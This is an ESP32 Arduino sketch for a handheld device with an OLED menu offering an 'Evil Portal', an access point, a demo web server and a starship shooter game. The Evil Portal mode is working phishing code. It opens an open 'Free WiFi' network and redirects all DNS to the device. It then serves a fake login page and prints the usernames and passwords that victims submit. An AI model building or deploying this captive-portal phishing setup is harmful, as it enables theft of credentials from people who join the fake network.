#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <SPIFFS.h>
#include "FS.h"
#include "SD.h"
#include <SPI.h>

// OLED Display Configuration
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SCREEN_ADDRESS 0x3C

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Button Pins
#define BUTTON_LEFT 12
#define BUTTON_RIGHT 13
#define BUTTON_SHOOT 14
#define BUTTON_START 27

// Menu Options
const char* menuOptions[] = {
  "Evil Portal",
  "WiFi Access Point",
  "Web Server",
  "Starship Game"
};

int currentMenuIndex = 0; // Start with Evil Portal selected
bool inMenu = true; // Flag to indicate if we are in the menu

// Game Variables
int playerX = 64;
int obstacleX, obstacleY;
int bulletCount = 5;
int bulletX[5], bulletY[5];
bool bulletActive[5] = {false};
int score = 0;
int lives = 3;
int speed = 2;
bool gameOver = false;

// Star positions
int starCount = 20;
int starX[20], starY[20];

// SD Card Configuration
#define SD_CS_PIN 5

DNSServer dnsServer; // Use DNSServer instead of AsyncDNSServer
AsyncWebServer server(80);

void initSDCard() {
  if (!SD.begin(SD_CS_PIN)) {
    Serial.println("Card Mount Failed");
    return;
  }

  uint8_t cardType = SD.cardType();
  if (cardType == CARD_NONE) {
    Serial.println("No SD card attached");
    return;
  }
  Serial.print("SD Card Type: ");
  if (cardType == CARD_MMC) {
    Serial.println("MMC");
  } else if (cardType == CARD_SD) {
    Serial.println("SDSC");
  } else if (cardType == CARD_SDHC) {
    Serial.println("SDHC");
  } else {
    Serial.println("UNKNOWN");
  }
  uint64_t cardSize = SD.cardSize() / (1024 * 1024);
  Serial.printf("SD Card Size: %lluMB\n", cardSize);
}

void initSPIFFS() {
  if (!SPIFFS.begin(true)) {
    Serial.println("An Error has occurred while mounting SPIFFS");
    return;
  }
  Serial.println("SPIFFS mounted successfully");
}

void setupWebServer() {
  server.onNotFound([](AsyncWebServerRequest * request) {
    request->send(SPIFFS, "/index.html", "text/html");
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest * request) {
    String username = request->arg("username");
    String password = request->arg("password");

    Serial.print("Username: ");
    Serial.println(username);
    Serial.print("Password: ");
    Serial.println(password);

    request->send(200, "text/plain", "Login successful!");
  });

  server.begin();
}

void setupWebServerSimple() {
  server.on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
    request->send(200, "text/plain", "Hello from ESP32 Web Server!");
  });
  server.begin();
}

void setupDNS() {
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", IPAddress(192, 168, 1, 1));
}

void selectMenuOption() {
  switch (currentMenuIndex) {
    case 0:
      // Initialize Evil Portal Feature
      Serial.println("Evil Portal Selected");
      initSPIFFS();
      WiFi.softAP("Free WiFi", nullptr);
      WiFi.softAPConfig(IPAddress(192, 168, 1, 1), IPAddress(192, 168, 1, 1), IPAddress(255, 255, 255, 0));
      setupDNS();
      setupWebServer();
      Serial.println("Evil Portal is running");
      break;
    case 1:
      // Initialize WiFi Access Point Feature
      Serial.println("WiFi Access Point Selected");
      WiFi.softAP("MyAccessPoint", "password123");
      Serial.println("Access Point is running");
      break;
    case 2:
      // Initialize Web Server Feature
      Serial.println("Web Server Selected");
      WiFi.softAP("MyAccessPoint", "password123");
      setupWebServerSimple();
      Serial.println("Web Server is running");
      break;
    case 3:
      // Start Starship Game
      Serial.println("Starting Starship Game");
      inMenu = false; // Exit menu to start game
      resetGame(); // Reset game state if needed
      break;
  }
}

void setup() {
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS)) {
    Serial.println("SSD1306 allocation failed");
    for (;;);
  }

  pinMode(BUTTON_LEFT, INPUT_PULLUP);
  pinMode(BUTTON_RIGHT, INPUT_PULLUP);
  pinMode(BUTTON_SHOOT, INPUT_PULLUP);
  pinMode(BUTTON_START, INPUT_PULLUP);

  initSDCard();
  initSPIFFS();

  // Initialize star positions
  for (int i = 0; i < starCount; i++) {
    starX[i] = random(0, SCREEN_WIDTH);
    starY[i] = random(0, SCREEN_HEIGHT);
  }

  resetGame();
}

void loop() {
  if (inMenu) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);

    // Display Menu Options
    for (int i = 0; i < 4; i++) {
      if (i == currentMenuIndex) {
        display.setTextColor(BLACK, WHITE); // Highlight selected option
      }
      display.setCursor(10, i * 10 + 10);
      display.println(menuOptions[i]);
      display.setTextColor(WHITE); // Reset color
    }

    display.display();

    // Handle Button Input for Menu Navigation
    if (digitalRead(BUTTON_LEFT) == LOW) {
      currentMenuIndex = (currentMenuIndex - 1 + 4) % 4;
      delay(200); // Debounce delay
    }

    if (digitalRead(BUTTON_RIGHT) == LOW) {
      currentMenuIndex = (currentMenuIndex + 1) % 4;
      delay(200); // Debounce delay
    }

    if (digitalRead(BUTTON_SHOOT) == LOW) {
      selectMenuOption();
      delay(200); // Debounce delay
    }

    return; // Exit loop early to avoid running game logic
  } else {
    // Run game logic here
    if (gameOver) {
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(15, 20);
      display.println("Game Over!");
      display.setCursor(20, 40);
      display.println("Press START");
      display.display();

      // Fix start button issue by debouncing
      static int startButtonState = HIGH;
      int currentStartButtonState = digitalRead(BUTTON_START);
      if (currentStartButtonState == LOW && startButtonState == HIGH) {
        delay(200); // Debounce delay
        if (digitalRead(BUTTON_START) == LOW) {
          resetGame();
          inMenu = true; // Return to menu after game over
        }
      }
      startButtonState = currentStartButtonState;
      return;
    }

    // Move Player
    if (digitalRead(BUTTON_LEFT) == LOW && playerX > 0) {
      playerX -= 2;
    }
    if (digitalRead(BUTTON_RIGHT) == LOW && playerX < SCREEN_WIDTH - 10) {
      playerX += 2;
    }

    // Shoot Bullets
    if (digitalRead(BUTTON_SHOOT) == LOW) {
      shootBullet();
    }

    // Move Bullets
    for (int i = 0; i < bulletCount; i++) {
      if (bulletActive[i]) {
        bulletY[i] -= 5;
        if (bulletY[i] < 0) {
          bulletActive[i] = false;
        }
      }
    }

    // Move obstacle
    obstacleY += speed;
    if (obstacleY > SCREEN_HEIGHT) {
      obstacleY = 0;
      obstacleX = random(0, SCREEN_WIDTH - 10);
      score++;
      if (score % 5 == 0) speed++;
    }

    // Collision Detection
    if (obstacleY > SCREEN_HEIGHT - 10 && abs(playerX + 5 - obstacleX) < 10) {
      lives--;
      obstacleY = 0;
      obstacleX = random(0, SCREEN_WIDTH - 10);
      if (lives == 0) gameOver = true;
    }

    // Bullet Collision Detection
    for (int i = 0; i < bulletCount; i++) {
      if (bulletActive[i] && abs(bulletX[i] - obstacleX) < 10 && bulletY[i] < obstacleY + 10) {
        obstacleY = 0;
        obstacleX = random(0, SCREEN_WIDTH - 10);
        bulletActive[i] = false;
        score += 2;
      }
    }

    // Draw Everything
    display.clearDisplay();

    // Draw Stars
    for (int i = 0; i < starCount; i++) {
      display.drawPixel(starX[i], starY[i], WHITE);
      if (starY[i] > SCREEN_HEIGHT) {
        starY[i] = 0;
        starX[i] = random(0, SCREEN_WIDTH);
      } else {
        starY[i]++;
      }
    }

    // Draw Score & Lives UI
    display.setTextSize(1);
    display.setTextColor(WHITE);

    // Score
    display.setCursor(0, 0);
    display.print("S: ");
    display.print(score);

    // Lives
    display.setCursor(80, 0);
    display.print("L: ");
    display.print(lives);

    // Draw Player (Triangle)
    display.drawLine(playerX + 4, SCREEN_HEIGHT - 8, playerX + 2, SCREEN_HEIGHT - 10, WHITE);
    display.drawLine(playerX + 4, SCREEN_HEIGHT - 8, playerX + 6, SCREEN_HEIGHT - 10, WHITE);
    display.drawLine(playerX + 2, SCREEN_HEIGHT - 10, playerX + 6, SCREEN_HEIGHT - 10, WHITE);

    // Draw Obstacle (Meteor)
    display.fillCircle(obstacleX + 4, obstacleY + 4, 4, WHITE); // Body
    display.drawLine(obstacleX + 4, obstacleY + 8, obstacleX + 4, obstacleY + 12, WHITE); // Tail
    display.drawLine(obstacleX + 2, obstacleY + 6, obstacleX, obstacleY + 8, WHITE); // Debris
    display.drawLine(obstacleX + 6, obstacleY + 6, obstacleX + 8, obstacleY + 8, WHITE); // Debris

    // Draw Bullets
    for (int i = 0; i < bulletCount; i++) {
      if (bulletActive[i]) {
        display.fillRect(bulletX[i], bulletY[i], 2, 5, WHITE);
      }
    }

    display.display();
    delay(50);
  }
}

void shootBullet() {
  for (int i = 0; i < bulletCount; i++) {
    if (!bulletActive[i]) {
      bulletX[i] = playerX + 4;
      bulletY[i] = SCREEN_HEIGHT - 8;
      bulletActive[i] = true;
      return;
    }
  }
}

void resetGame() {
  playerX = 64;
  obstacleX = random(0, SCREEN_WIDTH - 10);
  obstacleY = 0;
  for (int i = 0; i < bulletCount; i++) {
    bulletX[i] = 0;
    bulletY[i] = -10;
    bulletActive[i] = false;
  }
  score = 0;
  lives = 3;
  speed = 2;
  gameOver = false;
  // Reset stars
  for (int i = 0; i < starCount; i++) {
    starX[i] = random(0, SCREEN_WIDTH);
    starY[i] = random(0, SCREEN_HEIGHT);
  }
}
